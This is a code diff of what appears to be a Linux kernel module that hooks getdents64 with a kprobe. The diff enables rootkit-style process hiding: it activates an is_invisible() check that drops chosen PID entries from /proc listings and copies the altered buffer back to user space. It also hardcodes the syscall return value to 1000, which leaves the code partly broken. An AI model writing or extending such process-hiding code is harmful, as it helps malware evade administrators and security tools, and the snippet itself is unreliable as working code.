@@ -67,7 +67,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 
 	    //For storing the directory inode value
 	    struct inode *d_inode;
-		int ret = *(int*)(regs->user_regs.regs[0]);
+		int ret = 1000; // *(int*)(regs->user_regs.regs[0]);
 		wuwa_info("ret %d, pid %d", ret, pid_hide);
 		int err = 0;
 
@@ -92,13 +92,13 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 			wuwa_info("dent64: called for proc");
 		}
 
-		while (/*offset < ret*/true)
+		if(proc) {
+		while (offset < ret)
 	    {
 		    dir = (void *)kdirent + offset;
 
-		    if ((proc /* && is_invisible(simple_strtoul(dir->d_name, NULL, 10))*/))
-		    {
-				/*
+		    if ((proc  && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
+		    {			
 			    if (dir == kdirent)
 			    {
 				    ret -= dir->d_reclen;
@@ -106,19 +106,17 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 					wuwa_info("dent64: skipped");
 				    continue;
 			    }
-			    prev->d_reclen += dir->d_reclen;
-				*/
-				wuwa_info("dent64: skipped again");
-				
+			    prev->d_reclen += dir->d_reclen;			
+				wuwa_info("dent64: skipped again");			
 		    }
 		    else
 		    {
 			    prev = dir;
 		    }
-			break;
-		   // offset += dir->d_reclen;
+			// break;
+		    offset += dir->d_reclen;
 	    }
-/*	
+	
 	    // Copying directory name (or pid name) from kernel space to user space, after changing
 	    err = copy_to_user(dirent, kdirent, ret);
 	
@@ -126,7 +124,8 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 	    {
 	        goto out;
 	    }
-*/		
+		}
+		
 	out:
 	    kfree(kdirent);
 	    return;
